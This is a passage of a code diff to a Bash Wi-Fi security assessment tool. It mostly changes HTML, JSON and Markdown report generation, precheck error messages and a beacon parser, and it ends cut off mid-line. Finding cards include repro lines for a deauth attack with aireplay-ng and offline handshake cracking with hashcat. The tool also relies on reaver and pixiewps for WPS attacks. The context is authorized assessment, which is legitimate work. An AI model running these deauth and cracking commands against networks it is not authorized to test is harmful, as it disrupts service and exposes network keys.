-			html_findings+="$(_fcard "${fnd_sev[$i]}" "$fid" "Client isolation can be bypassed (AirSnitch)" config "Based on standard shared-group-key behavior (posture). Not actively run here; needs two of your own clients on a bench to prove." Planned "All clients on one BSSID share the same group key (GTK). One client can wrap a unicast packet in a GTK broadcast and reach an isolated peer. Routing and switch tricks also cross the isolation line. PMF does not stop this." "$isaff" "If the network relies on client isolation (guest or IoT wifi), one client can reach another, read its traffic, and on WPA2 PSK go to full man-in-the-middle." "$(_li_esc "one client reads or injects another client traffic" "possible full man-in-the-middle on WPA2 PSK" "broken guest or IoT separation")" "Put guest and IoT on their own VLAN and SSID. Block client to client at layer 3 on the gateway. Turn on IP and ARP spoof guards." "On a bench with two of your own clients, confirm one cannot reach the other after the fix." "$(_li_esc "class: Wi-Fi client isolation bypass (AirSnitch, NDSS 2026, Vanhoef et al.)" "taxonomy: MITRE ATT&CK T1557, T1040; CWE-300; CWE-923" "note: posture from scan facts, not an executed exploit" "proof: isolation_<bssid>_*.conf (one per net)")")"
+			html_findings_tech+="$(_fcard "${fnd_sev[$i]}" "$fid" "Client isolation can be bypassed (AirSnitch)" config "Based on standard shared-group-key behavior (posture). Not actively run here; needs two of your own clients on a bench to prove." Planned "All clients on one BSSID share the same group key (GTK). One client can wrap a unicast packet in a GTK broadcast and reach an isolated peer. Routing and switch tricks also cross the isolation line. PMF does not stop this." "$isaff" "If the network relies on client isolation (guest or IoT wifi), one client can reach another, read its traffic, and on WPA2 PSK go to full man-in-the-middle." "$(_li_esc "one client reads or injects another client traffic" "possible full man-in-the-middle on WPA2 PSK" "broken guest or IoT separation")" "Put guest and IoT on their own VLAN and SSID. Block client to client at layer 3 on the gateway. Turn on IP and ARP spoof guards." "On a bench with two of your own clients, confirm one cannot reach the other after the fix." "$(_li_esc "class: Wi-Fi client isolation bypass (AirSnitch, NDSS 2026, Vanhoef et al.)" "taxonomy: MITRE ATT&CK T1557, T1040; CWE-300; CWE-923" "note: posture from scan facts, not an executed exploit" "proof: isolation_<bssid>_*.conf (one per net)")")"
 			;;
 		pmf)
 			local paff=""
@@ -4981,7 +5661,7 @@ function make_report() {
 				IFS='|' read -r ie ib ipmf ienc <<<"$item"
 				paff+="<li>$(_html_escape "${ie} (${ib}), pmf ${ipmf}, enc ${ienc}")</li>"
 			done
-			html_findings+="$(_fcard MEDIUM "$fid" "Management frames are not protected (PMF / 802.11w off)" beacon "Based on beacon analysis (the PMF required bit is not set)." "Short term" "Protected Management Frames are not required. So a deauth packet works and pushes a client to redo the handshake. That helps capture the handshake and move clients to a fake access point." "$paff" "Without PMF an attacker can kick clients off, grab the WPA2 handshake for an offline crack, and run denial of service." "$(_li_esc "handshake capture for offline crack" "denial of service by deauth" "easier evil-twin coercion")" "Set PMF to required (WPA3), or at least capable, on every network." "Read the beacon RSN capabilities. The PMF required bit must be set." "$(_li_esc "repro: aireplay-ng --deauth 1 -a <bssid> <mon> then airodump-ng to catch the handshake" "standard: IEEE 802.11w; taxonomy: MITRE ATT&CK T1557" "proof: proof_<bssid>_pmf_off_*.conf")")"
+			html_findings_tech+="$(_fcard MEDIUM "$fid" "Management frames are not protected (PMF / 802.11w off)" beacon "Based on beacon analysis (the PMF required bit is not set)." "Short term" "Protected Management Frames are not required. So a deauth packet works and pushes a client to redo the handshake. That helps capture the handshake and move clients to a fake access point." "$paff" "Without PMF an attacker can kick clients off, grab the WPA2 handshake for an offline crack, and run denial of service." "$(_li_esc "handshake capture for offline crack" "denial of service by deauth" "easier evil-twin coercion")" "Set PMF to required (WPA3), or at least capable, on every network." "Read the beacon RSN capabilities. The PMF required bit must be set." "$(_li_esc "repro: aireplay-ng --deauth 1 -a <bssid> <mon> then airodump-ng to catch the handshake" "standard: IEEE 802.11w; taxonomy: MITRE ATT&CK T1557" "proof: proof_<bssid>_pmf_off_*.conf")")"
 			;;
 		nowpa3)
 			local naff=""
@@ -4989,7 +5669,7 @@ function make_report() {
 				IFS='|' read -r ie ib enc2 <<<"$item"
 				naff+="<li>$(_html_escape "${ie} (${ib}), enc ${enc2}")</li>"
 			done
-			html_findings+="$(_fcard LOW "$fid" "No WPA3 SAE" config "Based on configuration analysis (AKM is PSK only)." "Best practice" "The networks use WPA2 PSK only. A captured handshake or PMKID can be run through an offline dictionary crack." "$naff" "WPA2 PSK with a weak password can be cracked offline. WPA3 SAE blocks that path." "$(_li_esc "offline dictionary crack on a captured handshake" "weaker than WPA3 against offline attacks")" "Turn on WPA3 SAE (transition mode if old clients stay). Use a long random password." "Scan again. The network must advertise WPA3 SAE." "$(_li_esc "repro: hashcat -m 22000 <capture.22000> <wordlist>" "class: weak crypto posture (CWE-326)" "proof: proof_<bssid>_nowpa3_*.conf")")"
+			html_findings_tech+="$(_fcard LOW "$fid" "No WPA3 SAE" config "Based on configuration analysis (AKM is PSK only)." "Best practice" "The networks use WPA2 PSK only. A captured handshake or PMKID can be run through an offline dictionary crack." "$naff" "WPA2 PSK with a weak password can be cracked offline. WPA3 SAE blocks that path." "$(_li_esc "offline dictionary crack on a captured handshake" "weaker than WPA3 against offline attacks")" "Turn on WPA3 SAE (transition mode if old clients stay). Use a long random password." "Scan again. The network must advertise WPA3 SAE." "$(_li_esc "repro: hashcat -m 22000 <capture.22000> <wordlist>" "class: weak crypto posture (CWE-326)" "proof: proof_<bssid>_nowpa3_*.conf")")"
 			;;
 		cve)
 			local vaff=""
@@ -4997,11 +5677,13 @@ function make_report() {
 				IFS='|' read -r ie ib icv <<<"$item"
 				vaff+="<li>$(_html_escape "${ie} (${ib}), cves ${icv}")</li>"
 			done
-			html_findings+="$(_fcard INFO "$fid" "Chipset maps to public CVEs (info)" config "Based on a chipset to CVE map. Check the firmware version before calling it exploitable." "Best practice" "The chipset of these networks maps to public CVEs. This is background, not a confirmed exploit." "$vaff" "Some chipset CVEs can be exploitable on old firmware; most are patched on current firmware." "$(_li_esc "depends on firmware version" "informational only")" "Check firmware against the listed CVEs and update where needed." "Confirm the firmware version is newer than the fix for each CVE." "$(_li_esc "note: chip to cve map is info only; verify firmware before action")")"
+			html_findings_tech+="$(_fcard INFO "$fid" "Chipset maps to public CVEs (info)" config "Based on a chipset to CVE map. Check the firmware version before calling it exploitable." "Best practice" "The chipset of these networks maps to public CVEs. This is background, not a confirmed exploit." "$vaff" "Some chipset CVEs can be exploitable on old firmware; most are patched on current firmware." "$(_li_esc "depends on firmware version" "informational only")" "Check firmware against the listed CVEs and update where needed." "Confirm the firmware version is newer than the fix for each CVE." "$(_li_esc "note: chip to cve map is info only; verify firmware before action")")"
 			;;
 		esac
 	done
-	[[ -n "$html_findings" ]] || html_findings='<div class="panel"><p class="sub">No finding at or above INFO in scope and time.</p></div>'
+	html_findings_tech+="$_posture_html"
+	[[ -n "${_corpus_html:-}" ]] && html_findings_tech+="<details class=\"corpus\"><summary>Advisory corpus items (posture, collapsed)</summary>${_corpus_html}</details>"
+	[[ -n "$html_findings" ]] || html_findings='<div class="panel"><p class="sub">No confirmed critical with a proof file in scope and time. Open the technical view for posture items.</p></div>'
 
 	local cracked_list=""
 	for rec in ${_creds_use[@]+"${_creds_use[@]}"}; do
@@ -5052,10 +5734,10 @@ function make_report() {
 	[[ -n "$ev_rows" ]] || ev_rows="$(printf '<tr><td colspan="4">no proof files</td></tr>')"
 
 	{
-		printf '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Security Assessment Report - %s</title>' "$(_html_escape "$TOOL_NAME")"
+		printf '<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Security Report - %s</title>' "$(_html_escape "$TOOL_NAME")"
 		cat <<-'CSS'
 			<style>
-			:root{--bg:#eef1f6;--panel:#fff;--ink:#111827;--muted:#5b6472;--line:#e5e8ef;--safe:#15803d}
+			:root{--bg:#f4f4f4;--panel:#fff;--ink:#0a0a0a;--muted:#595959;--line:#e3e3e3;--safe:#595959}
 			*{box-sizing:border-box}
 			html{-webkit-print-color-adjust:exact;print-color-adjust:exact}
 			body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
@@ -5063,7 +5745,7 @@ function make_report() {
 			.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace}
 			h2.sec{font-size:13px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin:34px 0 12px;font-weight:700}
 			.panel{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:20px 22px;box-shadow:0 1px 2px rgba(16,24,40,.04)}
-			.hero{background:linear-gradient(135deg,#0f172a,#1e293b);color:#e8edf6;border-radius:16px;padding:26px 28px;position:relative;overflow:hidden}
+			.hero{background:#0a0a0a;color:#f4f4f4;border-radius:16px;padding:26px 28px;position:relative;overflow:hidden}
 			.hero:before{content:"";position:absolute;inset:0 0 auto auto;width:220px;height:220px;background:radial-gradient(circle at 70% 30%,var(--acc),transparent 60%);opacity:.5}
 			.hero .kicker{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:#93a4c0;margin:0 0 6px}
 			.hero h1{margin:0;font-size:28px;letter-spacing:-.01em}
@@ -5126,11 +5808,30 @@ function make_report() {
 			.foot{margin-top:28px;color:var(--muted);font-size:12px;text-align:center}
 			@media (max-width:640px){.risk{grid-template-columns:1fr}.rks{grid-template-columns:repeat(2,1fr)}.f-grid{grid-template-columns:1fr}.hero h1{font-size:22px}}
 			@media print{body{background:#fff}.wrap{max-width:none;padding:0}.panel,.finding,.key,.rk{box-shadow:none}.finding{page-break-inside:avoid}h2.sec{page-break-after:avoid}.risk{grid-template-columns:1fr;gap:10px}.rks{grid-template-columns:repeat(5,1fr)}.f-grid{grid-template-columns:1fr 1fr}.donutwrap{justify-content:flex-start}@page{size:A4;margin:12mm}}
+				.viewtoggle{margin:14px 0 0;text-align:right}
+				.viewtoggle button{font:inherit;font-size:13px;padding:6px 12px;border:1px solid var(--line);border-radius:999px;background:#fff;color:var(--muted);cursor:pointer}
+				.tech-only{display:none}
+				body.show-tech .tech-only{display:revert}
+				.sig-row{display:grid;grid-template-columns:minmax(120px,200px) 1fr 70px;gap:10px;align-items:center;margin:6px 0;font-size:13px}
+				.sig-lab{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+				.sig-track{background:var(--line);border-radius:6px;height:14px;overflow:hidden}
+				.sig-fill{height:100%;border-radius:6px}
+				.sig-val{text-align:right;color:var(--muted);font-variant-numeric:tabular-nums}
+				.logbar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
+				.logbar select,.logbar input,.logbar button{font:inherit;font-size:13px;padding:6px 10px;border:1px solid var(--line);border-radius:8px;background:#fff;color:var(--ink)}
+				.logbar button{cursor:pointer;color:var(--muted)}
+				.logrow{border-bottom:1px solid var(--line);padding:8px 2px;font-size:13px}
+				.logrow .lt{color:var(--muted);font-size:12px}
+				.lvl{display:inline-block;min-width:66px;font-size:11px;font-weight:700;letter-spacing:.04em}
+				.lvl.ERROR,.lvl.CRITICAL{color:#c1121f}.lvl.WARN{color:#595959}.lvl.INFO,.lvl.SUCCESS,.lvl.OK{color:#0a0a0a}.lvl.DEBUG{color:var(--muted)}
+				.logtech{color:var(--muted);font-size:12px;margin-top:3px;white-space:pre-wrap;word-break:break-word}
 			</style>
 		CSS
 		printf '</head><body><div class="wrap">'
 
-		printf '<div class="hero" style="--acc:%s"><p class="kicker">Security Assessment Report</p><h1>Wi-Fi security assessment</h1><div class="statusline" style="background:%s">&#9679; %s</div></div>' \
+		printf '%s' "$(_report_view_toggle)"
+
+		printf '<div class="hero" style="--acc:%s"><p class="kicker">Security Report</p><h1>Wi-Fi security report</h1><div class="statusline" style="background:%s">&#9679; %s</div></div>' \
 			"$status_col" "$status_col" "$(_html_escape "$status_txt")"
 
 		printf '<div class="meta"><div><div class="k">Date</div><div class="v">%s</div></div><div><div class="k">Scope</div><div class="v">%s</div></div><div><div class="k">Mode</div><div class="v">%s</div></div><div><div class="k">Networks tested</div><div class="v">%s</div></div><div><div class="k">Tool</div><div class="v">%s v%s</div></div></div>' \
@@ -5150,7 +5851,7 @@ function make_report() {
 		printf '<div class="legend"><div><span class="dot" style="background:%s"></span>Critical &nbsp;%s</div><div><span class="dot" style="background:%s"></span>High &nbsp;%s</div><div><span class="dot" style="background:%s"></span>Medium &nbsp;%s</div><div><span class="dot" style="background:%s"></span>Low &nbsp;%s</div></div></div></div>' \
 			"$(_sev_color CRITICAL)" "$n_crit" "$(_sev_color HIGH)" "$n_high" "$(_sev_color MEDIUM)" "$n_med" "$(_sev_color LOW)" "$n_low"
 
-		printf '<h2 class="sec">3. Key findings - 30 seconds</h2><div class="keys">'
+		printf '<h2 class="sec">3. Key findings in 30 seconds</h2><div class="keys">'
 		printf '<div class="key" style="--c:%s"><div class="t">Critical risk</div><div class="b">%s</div></div>' "$(_sev_color CRITICAL)" "$(_html_escape "$kf_crit")"
 		printf '<div class="key" style="--c:%s"><div class="t">Main cause</div><div class="b">%s</div></div>' "$(_sev_color HIGH)" "$(_html_escape "$kf_cause")"
 		printf '<div class="key" style="--c:%s"><div class="t">Scale</div><div class="b">%s</div></div>' "$(_sev_color MEDIUM)" "$(_html_escape "$kf_scale")"
@@ -5159,37 +5860,48 @@ function make_report() {
 
 		printf '<h2 class="sec">4. Assets overview</h2><div class="panel" style="padding:0;overflow:hidden"><table><thead><tr><th>Severity</th><th>Network</th><th>BSSID</th><th>Channel</th><th>Security</th><th>Result</th></tr></thead><tbody>%s</tbody></table></div>' "$html_assets"
 
+		printf '<h2 class="sec">Channel map</h2>%s' "$(_report_channel_chart)"
+
+		printf '<h2 class="sec">Signal analysis</h2>%s%s' "$(_report_signal_chart)" "$(_report_signal_hist)"
+
 		printf '<h2 class="sec">5. Findings</h2>%s' "$html_findings"
+		[[ -n "$html_findings_tech" ]] && printf '<div class="tech-only findings-tech">%s</div>' "$html_findings_tech"
 
 		printf '<h2 class="sec">6. Remediation plan</h2><div class="panel" style="padding:0;overflow:hidden"><table><thead><tr><th>Priority</th><th>Action</th><th>Affected</th><th>Effort</th><th>Expected result</th></tr></thead><tbody>%s</tbody></table></div>' "$remed"
 
 		printf '<h2 class="sec">7. Positive findings</h2><div class="panel"><ul class="pos">'
-		printf '<li><span class="chk">&#10003;</span>%s</li>' "All listed networks use WPA2 encryption. No open or WEP network is in the results."
+		if ((n_open > 0)); then
+			printf '<li><span class="chk" style="background:#fdeaec;color:#c1121f">!</span>%s</li>' "$(_html_escape "${n_open} open/unencrypted network(s) found. Not a positive. See the assets table.")"
+		else
+			printf '<li><span class="chk">&#10003;</span>%s</li>' "No open or unencrypted network was found. Assessed networks use WPA2 or stronger."
+		fi
 		printf '<li><span class="chk">&#10003;</span>%s</li>' "Every finding has a proof file hashed with SHA-256, so a third party can verify it."
 		printf '<li><span class="chk">&#10003;</span>%s</li>' "Only in-scope networks were tested."
 		printf '<li><span class="chk">&#10003;</span>%s</li>' "No active man-in-the-middle was run. Client isolation is reported as posture only."
 		printf '</ul></div>'
 
-		printf '<h2 class="sec">8. Evidence</h2><div class="panel" style="padding:0;overflow:hidden"><table><thead><tr><th>Type</th><th>File</th><th>SHA-256</th><th>Size</th></tr></thead><tbody>%s</tbody></table></div>' "$ev_rows"
-		printf '<p class="sm sub" style="margin:8px 4px">Secrets are masked in the report body. The SHA-256 lets a third party check each proof file is unchanged. Keys are %s (REVEAL_CREDS=%s).</p>' \
+		printf '<h2 class="sec tech-only">8. Evidence</h2><div class="panel tech-only" style="padding:0;overflow:hidden"><table><thead><tr><th>Type</th><th>File</th><th>SHA-256</th><th>Size</th></tr></thead><tbody>%s</tbody></table></div>' "$ev_rows"
+		printf '<p class="sm sub tech-only" style="margin:8px 4px">Secrets are masked in the report body. The SHA-256 lets a third party check each proof file is unchanged. Keys are %s (REVEAL_CREDS=%s).</p>' \
 			"$([[ "${REVEAL_CREDS:-0}" == "1" ]] && printf 'shown in the proof files' || printf 'masked')" "${REVEAL_CREDS:-0}"
 
-		printf '<h2 class="sec">9. Methodology and limits</h2><div class="panel">'
+		printf '<h2 class="sec tech-only">9. Methodology and limits</h2><div class="panel tech-only">'
 		printf '<p style="margin-top:0"><b>Data.</b> Per-network facts from beacons (sar.jsonl), plus the attack results and the proof files.</p>'
 		printf '<p><b>Checks.</b> WPS (pixie dust, vendor and default PIN, null/empty), WPA2 handshake / PMKID crack, PMF (802.11w) posture, WPA3 posture, client isolation posture (AirSnitch).</p>'
 		printf '<p><b>Tools.</b> %s</p>' "$(_html_escape "$tools_txt")"
 		printf '<p><b>Not tested.</b> No active man-in-the-middle, no client isolation exploit, no WPA3 downgrade, no networks outside the scan window or below the signal floor.</p>'
 		printf '<p style="margin-bottom:0"><b>Limits.</b> WPS, PMF and encryption are read from beacons and can change. A no-crack result is not proof of a strong key. Client isolation is posture from facts, not an executed exploit.</p></div>'
 
-		printf '<h2 class="sec">10. Final recommendations - top 5</h2><div class="panel"><ol class="top">'
+		printf '<div class="tech-only"><h2 class="sec">Diagnostic logs</h2>%s</div>' "$(_report_diag_logs)"
+
+		printf '<h2 class="sec">10. Final recommendations top 5</h2><div class="panel"><ol class="top">'
 		printf '<li>%s</li>' "Turn WPS off on all networks (PIN and push button)."
-		printf '<li>%s</li>' "Change the wifi password on every cracked network now; the old keys are known."
+		printf '<li>%s</li>' "Change the wifi password on every cracked network now. The old keys are known."
 		printf '<li>%s</li>' "Require PMF (802.11w) on every network."
 		printf '<li>%s</li>' "Move to WPA3 SAE with a long random password."
-		printf '<li>%s</li>' "Put guest and IoT on their own VLAN and SSID; block client to client at layer 3."
+		printf '<li>%s</li>' "Put guest and IoT on their own VLAN and SSID. Block client to client at layer 3."
 		printf '</ol></div>'
 
-		printf '<div class="foot">%s v%s &middot; report v%s &middot; %s &middot; to save a PDF: open this file in a browser and use Print, Save as PDF (A4) &middot; refs: US-CERT VU#723755; AirSnitch NDSS 2026; MITRE ATT&amp;CK T1557/T1040; CWE-300/923/1392/326</div>' \
+		printf '<div class="foot">%s v%s &middot; report v%s &middot; %s &middot; to save a PDF: open this file in a browser and use Print, Save as PDF (A4) &middot; refs: US-CERT VU#723755, AirSnitch NDSS 2026, MITRE ATT&amp;CK T1557/T1040, CWE-300/923/1392/326</div>' \
 			"$(_html_escape "$TOOL_NAME")" "$(_html_escape "$VERSION")" "${REPORT_VERSION:-5}" "$(_html_escape "$now_dot")"
 
 		printf '</div></body></html>'
@@ -5204,11 +5916,45 @@ function make_report() {
 	fi
 	chmod 600 "$path_html" 2>/dev/null || true
 
+	# JSON + Markdown siblings (same stem): same stats as the HTML, for tooling
+	# and quick diffs. Built from the per-asset arrays already assembled above.
+	local _base="${path_html%.html}" _first=1 _a
+	{
+		printf '{"tool":"%s","version":"%s","date":"%s","scope":"%s","mode":"%s",' \
+			"$(json_escape "$TOOL_NAME")" "$(json_escape "$VERSION")" "$(json_escape "$now_dot")" "$(json_escape "$scope_lbl")" "$(json_escape "$mode_lbl")"
+		printf '"networks_tested":%s,"open_networks":%s,"assessed":%s,"new":%s,' "$n_ap" "$n_open" "$n_ap" "${#as_name[@]}"
+		printf '"findings":{"critical":%s,"high":%s,"medium":%s,"low":%s,"info":%s},' "$n_crit" "$n_high" "$n_med" "$n_low" "$n_info"
+		printf '"assets":['
+		for _a in "${!as_name[@]}"; do
+			((_first)) && _first=0 || printf ','
+			printf '{"severity":"%s","network":"%s","bssid":"%s","channel":"%s","band":"%s","security":"%s","result":"%s"}' \
+				"$(_sev_label "${as_sev[$_a]}")" "$(json_escape "${as_name[$_a]}")" "$(json_escape "${as_bss[$_a]}")" \
+				"$(json_escape "${as_ch[$_a]}")" "$(json_escape "${as_band[$_a]}")" "$(json_escape "${as_sec[$_a]}")" "$(json_escape "${as_res[$_a]}")"
+		done
+		printf ']}\n'
+	} >"${_base}.json.tmp" 2>/dev/null && mv -f "${_base}.json.tmp" "${_base}.json" 2>/dev/null || rm -f "${_base}.json.tmp" 2>/dev/null
+	chmod 600 "${_base}.json" 2>/dev/null || true
+	{
+		printf '# Wi-Fi security report\n\n'
+		printf '%s v%s - %s - scope: %s - mode: %s\n\n' "$TOOL_NAME" "$VERSION" "$now_dot" "$scope_lbl" "$mode_lbl"
+		printf 'Networks tested: %s (open/unencrypted: %s)\n\n' "$n_ap" "$n_open"
+		printf '## Findings\n\n| Critical | High | Medium | Low | Info |\n|---|---|---|---|---|\n| %s | %s | %s | %s | %s |\n\n' "$n_crit" "$n_high" "$n_med" "$n_low" "$n_info"
+		printf '## Assets\n\n| Severity | Network | BSSID | Channel | Security | Result |\n|---|---|---|---|---|---|\n'
+		for _a in "${!as_name[@]}"; do
+			printf '| %s | %s | %s | ch%s/%s | %s | %s |\n' \
+				"$(_sev_label "${as_sev[$_a]}")" "${as_name[$_a]//|/\\|}" "${as_bss[$_a]}" "${as_ch[$_a]}" "${as_band[$_a]}" "${as_sec[$_a]//|/\\|}" "${as_res[$_a]}"
+		done
+	} >"${_base}.md.tmp" 2>/dev/null && mv -f "${_base}.md.tmp" "${_base}.md" 2>/dev/null || rm -f "${_base}.md.tmp" 2>/dev/null
+	chmod 600 "${_base}.md" 2>/dev/null || true
+
 	if [[ "${ENABLE_REPORT_DEDUP:-1}" == "1" && -s "$path_html" && ${#_newset[@]} -gt 0 ]]; then
 		report_state_add "${REPORT_STATE_VULN:-}" "${!_newset[@]}"
 	fi
+	if [[ "${ENABLE_REPORT_DEDUP:-1}" == "1" && -s "$path_html" && ${#POSTURE_NEW[@]} -gt 0 ]]; then
+		report_state_add "${REPORT_STATE_POSTURE:-}" "${POSTURE_NEW[@]}"
+	fi
 
-	print_log OK REPORT "Report: ${path_html##*/} (html; open in a browser, Print to PDF; nets=$n_ap keys=${#_creds_use[@]} crit=$n_crit high=$n_high)"
+	print_log OK REPORT "report saved"
 	return 0
 }
 
@@ -5382,18 +6128,18 @@ function auto_install_deps() {
 function run_precheck() {
 	validate_env
 	if [[ $EUID -ne 0 ]]; then
-		print_log ERROR FATAL "Need root"
+		log_error_detail FATAL "Permission denied." "This tool needs root to use the adapter." "Run with sudo, or as root." "EUID=$EUID, need 0."
 		exit 1
 	fi
 	if ! ip link show "$IFACE" &>/dev/null; then
-		print_log ERROR FATAL "No iface: $IFACE"
+		log_error_detail FATAL "Adapter not found." "The adapter is missing or turned off." "Plug in the adapter and turn it on. List adapters with: ip link." "ip link show $IFACE failed."
 		exit 1
 	fi
 
 	local c
 	for c in ip iw wpa_supplicant wpa_cli pixiewps reaver awk sort grep sed tr timeout flock mktemp sha256sum; do
 		if ! command -v "$c" &>/dev/null; then
-			print_log ERROR FATAL "Missing: $c"
+			log_error_detail FATAL "Tool missing." "A needed program is not installed." "Install $c, then run again." "command not found: $c"
 			exit 1
 		fi
 	done
@@ -5410,7 +6156,7 @@ function run_precheck() {
 	fi
 
 	TMP_DIR="$(mktemp -d "${TMPDIR:-/tmp}/${TOOL_NAME}.XXXXXX")" || {
-		print_log ERROR FATAL "Temp dir failed"
+		log_error_detail FATAL "Cannot make temp folder." "The system could not make a work folder." "Check free disk space and TMPDIR permissions." "mktemp -d failed under ${TMPDIR:-/tmp}."
 		exit 1
 	}
 
@@ -5427,6 +6173,11 @@ function run_precheck() {
 
 	LOG_SESSION="${TMP_DIR}/session.log"
 	LOG_AUDIT="${LOG_DIR}/cp_audit.log"
+	LOG_EVENTS="${LOG_DIR}/events.jsonl"
+	[[ -n "$SCAN_ID" ]] || SCAN_ID="cp-$(date -u +%Y%m%dT%H%M%SZ 2>/dev/null || date +%s)-$$"
+	RUN_START_TS="$(date +%s 2>/dev/null || echo 0)"
+	_log_rotate "$LOG_AUDIT"
+	_log_rotate "$LOG_EVENTS"
 	WPS_CONF="${TMP_DIR}/wpa_supplicant.conf"
 	WPS_LOG="${TMP_DIR}/wpa_supplicant.log"
 	SCAN_RAW="${TMP_DIR}/raw_scan.txt"
@@ -5438,6 +6189,7 @@ function run_precheck() {
 
 	REPORT_STATE_RECON="${LOG_DIR}/recon_reported.txt"
 	REPORT_STATE_VULN="${LOG_DIR}/vuln_reported.txt"
+	REPORT_STATE_POSTURE="${LOG_DIR}/posture_reported.txt"
 	if [[ "${ENABLE_REPORT_DEDUP:-1}" == "1" ]]; then
 		report_state_init
 	fi
@@ -5560,7 +6312,7 @@ rsnxe_add("BIT:" b)
 }
 function is_mac(s,  t,c){if(s!~/^[0-9a-fA-F:]+$/)return 0;t=s;c=gsub(/:/,"@",t);return c==5}
 function reset(){bssid="";essid="";sig="";wps_on=0;ver="unknown";ap_locked="NO";sel_reg="NO";wpa3="NO";pmf="NO";dpp="NO";wps_hidden="NO";wps_state="unknown";cfg_methods="0x0000";tkip="NO";wpa1="NO";dpp_on=0;dpp_ver="unknown";dpp_conf="NO";dpp_pkex="NO";psk="NO";owe="NO";freq="";dpid="unknown";maker="";model="";fw="";devname="";serial="";uuid="";channel=1;rsn_caps="NO";akm_list="";rsn_gw="";rsn_pw="";rsn_gm="";rsnxe_list="";rsnxe_cap_hex="";extcap_list="";owe_tm="NO";td_bitmap="";in_rsn=0;in_rsnxe=0;in_extcap=0;in_wps=0;in_legacy_wpa=0;in_he_cap=0;in_he_op=0;he_present="";he_capabilities_present="";he_operation_present="";he_bss_color="";he_twt_supported="";he_ul_mu_mimo="";he_dl_mu_mimo="";he_ul_ofdma="";he_dl_ofdma="";he_160mhz="";he_80p80="";he_spatial_streams="";he_raw_capabilities_hex="";he_mac_hex="";he_phy_hex="";he_ss_max=0;in_eht_cap=0;in_eht_op=0;eht_present="";eht_capabilities_present="";eht_operation_present="";eht_320mhz="";eht_puncturing_supported="";eht_mlo_supported="";eht_mlo_ap="";eht_spatial_streams="";eht_mcs_max="";eht_raw_capabilities_hex="";eht_mac_hex="";eht_phy_hex="";eht_ss_max=0;eht_mcs_hi=0}
-function row(){if(he_ss_max>0)he_spatial_streams=he_ss_max ""; if(he_mac_hex!=""||he_phy_hex!=""){he_raw_capabilities_hex=""; if(he_mac_hex!="")he_raw_capabilities_hex="MAC:" he_mac_hex; if(he_phy_hex!=""){if(he_raw_capabilities_hex!="")he_raw_capabilities_hex=he_raw_capabilities_hex ";"; he_raw_capabilities_hex=he_raw_capabilities_hex "PHY:" he_phy_hex}} if(eht_ss_max>0)eht_spatial_streams=eht_ss_max ""; if(eht_mcs_hi>0)eht_mcs_max=eht_mcs_hi ""; if(eht_mac_hex!=""||eht_phy_hex!=""){eht_raw_capabilities_hex=""; if(eht_mac_hex!="")eht_raw_capabilities_hex="MAC:" eht_mac_hex; if(eht_phy_hex!=""){if(eht_raw_capabilities_hex!="")eht_raw_capabilities_hex=eht_raw_capabilities_hex ";"; eht_raw_capabilities_hex=eht_raw_capabilities_hex "PHY:" eht_phy_hex}} return bssid"\036"essid"\036"sig"\036"ver"\036"ap_locked"\036"sel_reg"\036"wpa3"\036"pmf"\036"dpp"\036"wps_hidden"\036"wps_state"\036"cfg_methods"\036"tkip"\036"wpa1"\036"dpp_ver"\036"dpp_conf"\036"dpp_pkex"\036"psk"\036"owe"\036"channel"\036"dpid"\036"maker"\036"model"\036"fw"\036"devname"\036"serial"\036"uuid"\036"rsn_caps"\036"akm_list"\036"rsn_gw"\036"rsn_pw"\036"rsn_gm"\036"rsnxe_list"\036"extcap_list"\036"owe_tm"\036"td_bitmap"\036"rsnxe_cap_hex"\036"he_present"\036"he_capabilities_present"\036"he_operation_present"\036"he_bss_color"\036"he_twt_supported"\036"he_ul_mu_mimo"\036"he_dl_mu_mimo"\036"he_ul_ofdma"\036"he_dl_ofdma"\036"he_160mhz"\036"he_80p80"\036"he_spatial_streams"\036"he_raw_capabilities_hex"\036"eht_present"\036"eht_capabilities_present"\036"eht_operation_present"\036"eht_320mhz"\036"eht_puncturing_supported"\036"eht_mlo_supported"\036"eht_mlo_ap"\036"eht_spatial_streams"\036"eht_mcs_max"\036"eht_raw_capabilities_hex}
+function row(){if(he_ss_max>0)he_spatial_streams=he_ss_max ""; if(he_mac_hex!=""||he_phy_hex!=""){he_raw_capabilities_hex=""; if(he_mac_hex!="")he_raw_capabilities_hex="MAC:" he_mac_hex; if(he_phy_hex!=""){if(he_raw_capabilities_hex!="")he_raw_capabilities_hex=he_raw_capabilities_hex ";"; he_raw_capabilities_hex=he_raw_capabilities_hex "PHY:" he_phy_hex}} if(eht_ss_max>0)eht_spatial_streams=eht_ss_max ""; if(eht_mcs_hi>0)eht_mcs_max=eht_mcs_hi ""; if(eht_mac_hex!=""||eht_phy_hex!=""){eht_raw_capabilities_hex=""; if(eht_mac_hex!="")eht_raw_capabilities_hex="MAC:" eht_mac_hex; if(eht_phy_hex!=""){if(eht_raw_capabilities_hex!="")eht_raw_capabilities_hex=eht_raw_capabilities_hex ";"; eht_raw_capabilities_hex=eht_raw_capabilities_hex "PHY:" eht_phy_hex}} return 